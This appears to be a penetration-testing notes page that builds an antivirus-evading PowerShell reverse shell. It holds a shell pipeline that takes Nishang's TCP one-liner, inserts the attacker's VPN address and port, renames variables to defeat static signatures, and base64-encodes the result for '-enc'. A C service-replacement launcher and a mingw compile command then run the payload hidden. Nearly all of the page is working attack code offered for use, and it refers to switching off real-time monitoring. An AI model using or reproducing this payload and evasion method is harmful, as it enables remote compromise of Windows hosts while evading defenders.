---
description: Invoke-PowerShellTcpOneLine.ps1
---

# Bypass WinDef

The reverse shell itself is [Nishang](https://github.com/samratashok/nishang)’s `Invoke-PowerShellTcpOneLine.ps1`, which ships as a three-line file: two comment lines of instructions, then the one-liner itself, commented out on line 3 so it cannot run by accident. Getting from that file to an `-enc` argument is one pipeline:

{% code overflow="wrap" %}
```bash
cat ~/tools/nishang/Shells/Invoke-PowerShellTcpOneLine.ps1 \
  | head -n3 | tail -n1 | cut -c2- \
  | sed "s/192.168.254.1/$(ip -4 -o addr show tun0 | awk '{print $4}' | cut -d/ -f1)/" \
  | sed 's/4444/9999/' \
  | sed 's/\$client/\$cln/g'   | sed 's/\$stream/\$stn/g' \
  | sed 's/\$bytes/\$bts/g'    | sed 's/\$data/\$dta/g' \
  | sed 's/\$sendback/\$sbk/g' | sed 's/\$sendbyte/\$sbt/g' \
  | sed 's/+ '\''PS '\'' + (pwd).Path //' \
  | iconv -t utf-16le | base64 -w0
```
{% endcode %}

Each stage earns its place:

* `head -n3 | tail -n1` selects line 3, the payload, and `cut -c2-` strips the leading `#` that keeps it inert in the repository.
* The first two `sed`s substitute the hardcoded defaults, `192.168.254.1` and port `4444`, for the VPN address and the listener port.
* The six variable renames (`$client` to `$cln`, `$stream` to `$stn`, and so on) are **static signature evasion**. Nishang is a decade-old public toolkit and its one-liner is byte-for-byte in every AV signature database; the logic is not what gets flagged, the literal string is. Renaming the variables changes every matching byte sequence while leaving behaviour identical.
* Deleting `+ 'PS ' + (pwd).Path` drops the working directory from the prompt string. It shortens the payload and removes another distinctive literal, at the cost of a prompt that is just `>` .
* `iconv -t utf-16le | base64 -w0` produces exactly what `-enc` expects: PowerShell decodes that argument as UTF-16LE, so encoding from UTF-8 yields a script full of null bytes and a silent failure.

> This defeats **static** signatures only. AMSI still sees the decoded script at execution time, which is why real-time monitoring gets turned off in a later step rather than relied upon to miss this. Renaming variables is a first-order transformation and should be treated as buying quiet, not invisibility.

The service manager runs the `ImagePath` binary, so the replacement has to be a PE file. A three-line C launcher compiled with mingw is enough: it never tries to be a real service, it just spawns the encoded payload with no window and returns.

{% code overflow="wrap" %}
```bash
#include <windows.h>
int WINAPI WinMain(HINSTANCE h,HINSTANCE p,LPSTR c,int s){
    STARTUPINFOA si={sizeof(si)}; PROCESS_INFORMATION pi;
    char cmd[]="powershell -nop -w hidden -ep bypass -enc <base64 UTF-16LE reverse shell>";
    CreateProcessA(NULL,cmd,NULL,NULL,FALSE,CREATE_NO_WINDOW,NULL,NULL,&si,&pi);
    return 0;
}
```
{% endcode %}

{% code overflow="wrap" %}
```bash
x86_64-w64-mingw32-gcc launch.c -o payload.exe -mwindows -s
```
{% endcode %}
